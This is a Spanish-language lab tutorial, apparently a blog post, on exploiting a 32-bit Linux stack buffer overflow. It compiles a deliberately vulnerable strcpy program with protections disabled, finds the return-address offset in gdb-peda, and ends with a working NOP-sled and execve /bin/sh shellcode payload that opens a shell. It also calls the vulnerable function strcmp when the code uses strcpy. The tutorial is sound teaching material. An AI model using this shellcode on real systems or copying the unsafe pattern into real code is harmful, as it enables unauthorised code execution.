---
layout: single
title:  Expotando el Buffer Overflow de tipo stack Based (linux 32 bits)
excerpt: "En este post se explica los conceptos basicos en la explotación de un error basado en pila de la memoria con un depurador muy conocido como es gdb hasta conseguir hasta conseguir la ejecución de comandosa traves de un desbordamiento de buffer."
date: 2021-04-22
classes: wide
header:
    teaser: /assets/images/boflinux/buffer.png
    teaser_home_page: true
categories:
    - BoF
tags:
    - linux
    - Buffer Overflow
---

- [Antecedentes](#Antecedente)
- [Creacion del script en C vulnerable](#creando-script-en-c)
- [Calculando el offset](calculando-el-offset)

## Antecedentes:
Antes de comenzar, debo decir que todo el procedimiento del laboratorio se llevará a cabo en una maquina virtual  especificamente en un sistema **ubuntu 14.04** de 32 bits , puedes programa de virtualizacion como VirtualBox o VMware.
![virtualbox](../1.png)

Puedes comprobar con la siguiente sentencia para ver la informacion del sistema
```bash
> uname -a
Linux ubuntu 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 i686 i686 GNU/Linux
```
---
**Instalacion de peda**
Para el proceso de debugging (depuración del programa) estaré utilizando gdb con un plugin adicional para darle una salida mas colorida y elegante.

Para añadir [peda](https://github.com/longld/peda) solo tienes que seguir las instrucciones que se especifican en el propio proyecto.
![peda](2.png)


## Creando script en C
El siguiente codigo es un simple script escrito en C , donde basicamente la parte vulnerable estaría concentrado en el método **strcmp**.
```bash
#include<stdio.h>
#include<string.h>

void vulnerable(char *buff){
        char buffer[64];
        strcpy(buffer,buff);
}

void main(int argc, char **argv){
        vulnerable(argv[1]);
}
```

### Compilación del script
```bash
gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 buffer.c -o buffer
```
| argumento                    |                descripción                  |
|:-----------------------------|:--------------------------------------------|
| -z execstack                 | deshabilitar la pila de no ejecución        | 
| -g -fno-stack-protector      | desactiva la protección de la pila          |
| -mpreferred-stack-boundary=2 | desmontar fácilmente lo que está sucediendo |
| buffer                       | nombre de la salida del ejecutable          |




Puedo ver si el binario cuenta con protecciones.

Podemos ver que el DEP está deshabilitado
```bash
checksec --file buffer
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   buffer
```

**ldd** es una utilidad de linea de comandos de linux que se utiliza para conocer las bibliotecas compartidas. 

**ASLR desactivado**


```bash
> ldd buffer
        linux-gate.so.1 =>  (0xb7769000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75a0000)
        /lib/ld-linux.so.2 (0xb776b000)
> ldd buffer
        linux-gate.so.1 =>  (0xb779f000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75d6000)
        /lib/ld-linux.so.2 (0xb77a1000)
> ldd buffer
        linux-gate.so.1 =>  (0xb778e000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c5000)
        /lib/ld-linux.so.2 (0xb7790000)
```

#### Deshabilitar el ASLR

## Creando script en C:
```bash
#include<stdio.h>
#include<string.h>

void vulnerable(char *buff){
        char buffer[64];
        strcpy(buffer,buff);
}
 
void main(int argc, char **argv){
        vulnerable(argv[1]);
}
```

## Ejecutando el programa.
```bash
gdb-peda$ run AAA
Starting program: /home/noroot/buffer_overflow/buffer AAA
[Inferior 1 (process 2791) exited with code 0214]
Warning: not running
```

Ejecutando el script el script con un parámetro superior al indicado en el programa
```bash
./buffer $(python -c "print 'A'*100")
Segmentation fault (core dumped)
```

### Memoria EIP sobreescrita
Al enviar un argumento de 100 A's se puede apreciar como el depurador nos indica que EIP esta pauntando a la direción ```0x41414141```.

```bash
gdb-peda$ run $(python -c "print 'A'*100")
Starting program: /home/noroot/buffer_overflow/buffer $(python -c "print 'A'*100")

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff02c ('A' <repeats 100 times>)
EBX: 0xb7fc0000 --> 0x1acda8
ECX: 0xbffff370 --> 0x44580041 ('A')
EDX: 0xbffff08f --> 0x41 ('A')
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff074 ('A' <repeats 28 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff074 ('A' <repeats 28 times>)
0004| 0xbffff078 ('A' <repeats 24 times>)
0008| 0xbffff07c ('A' <repeats 20 times>)
0012| 0xbffff080 ('A' <repeats 16 times>)
0016| 0xbffff084 ('A' <repeats 12 times>)
0020| 0xbffff088 ("AAAAAAAA")
0024| 0xbffff08c ("AAAA")
0028| 0xbffff090 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```


### Registros
La definición mas simple de un registro es entenderlo como sifuese una variable. Se trata de una región de memoria en la que podemos almacenar y leer datos. La diferencia con las variables que nosotros definimos es que los registro sirven para un propósito en concreto y son limitados.

ESP : Es un puntero al final de la pila.
EIP  : Contiene la dirección actual de ejecución del programa.
EBP : Según el compilador usado, EBP puede ser usado como registro de caracter general o como puntero al marco de la pila.

Generando una cadena de 100 bytes encontrar en que dirección se encuentra EIP
```bash
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

Buscanco el **EIP**
A traves de la utilida pattern_search de gdb le indicamos la dirección que estamos buscando.
```bash
gdb-peda$ pattern_search 0x41413341
Registers contain pattern buffer:
EBP+0 found at offset: 64
EIP+0 found at offset: 68
Registers point to pattern buffer:
[EAX] --> offset 0 - size ~100
[ESP] --> offset 72 - size ~28
Pattern buffer found at:
0xbffff02c : offset    0 - size  100 ($sp + -0x48 [-18 dwords])
0xbffff30d : offset    0 - size  100 ($sp + 0x299 [166 dwords])
References to pattern buffer found at:
0xbffff014 : 0xbffff02c ($sp + -0x60 [-24 dwords])
0xbffff024 : 0xbffff02c ($sp + -0x50 [-20 dwords])
0xbffff028 : 0xbffff30d ($sp + -0x4c [-19 dwords])
0xbffff118 : 0xbffff30d ($sp + 0xa4 [41 dwords])

```

Ver los valores que hay en la pila
Si queremos ver los 100 últimos registros de la pila y 8 bytes antes
```bash
gdb-peda$ x/100wx $esp-8
0xbffff02c:     0x41414141      0x42424242      0x43434343      0x43434343
0xbffff03c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff04c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff05c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff06c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff07c:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff08c:     0x43434343      0x43434343      0x43434343      0xb7e2ca00
0xbffff09c:     0xb7fff000      0x00000002      0x08048320      0x00000000
0xbffff0ac:     0x08048341      0x08048437      0x00000002      0xbffff0d4
0xbffff0bc:     0x08048450      0x080484c0      0xb7fed300      0xbffff0cc
0xbffff0cc:     0x0000001c      0x00000002      0xbffff2a1      0xbffff2c5
0xbffff0dc:     0x00000000      0xbffff372      0xbffff37d      0xbffff38f
0xbffff0ec:     0xbffff3a0      0xbffff3d2      0xbffff3e8      0xbffff3f7
0xbffff0fc:     0xbffff42c      0xbffff441      0xbffff458      0xbffff468
0xbffff10c:     0xbffff479      0xbffff48b      0xbffff4bf      0xbffff503
0xbffff11c:     0xbffff532      0xbffff53e      0xbffffa5f      0xbffffa99
0xbffff12c:     0xbffffacd      0xbffffafd      0xbffffb30      0xbffffb82
0xbffff13c:     0xbffffb8e      0xbffffbd2      0xbffffbe9      0xbffffc47
0xbffff14c:     0xbffffc56      0xbffffc77      0xbffffc89      0xbffffcaa
0xbffff15c:     0xbffffcb3      0xbffffcc7      0xbffffcde      0xbffffcef
0xbffff16c:     0xbffffd25      0xbffffd34      0xbffffd51      0xbffffd63
0xbffff17c:     0xbffffd6c      0xbffffd7e      0xbffffd98      0xbffffda7
0xbffff18c:     0xbffffdaf      0xbffffdc1      0xbffffdd0      0xbffffdfc
0xbffff19c:     0xbffffe0b      0xbffffe25      0xbffffe37      0xbffffe73
0xbffff1ac:     0xbffffec2      0xbffffee2      0xbffffef7      0xbfffff01
```

Finalmente ha sido posible ejecutarse comandos explotando un buffer overflow en un sistema linux.
```bash
gdb-peda$ run $(python -c "print 'A'*68 + '\x74\xf0\xff\xbf' + '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
Starting program: /home/noroot/buffer_overflow/buffer $(python -c "print 'A'*68 + '\x74\xf0\xff\xbf' + '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
process 3309 is executing new program: /bin/dash
$ whoami
[New process 3315]
process 3315 is executing new program: /usr/bin/whoami
noroot
$ [Inferior 2 (process 3315) exited normally]
```
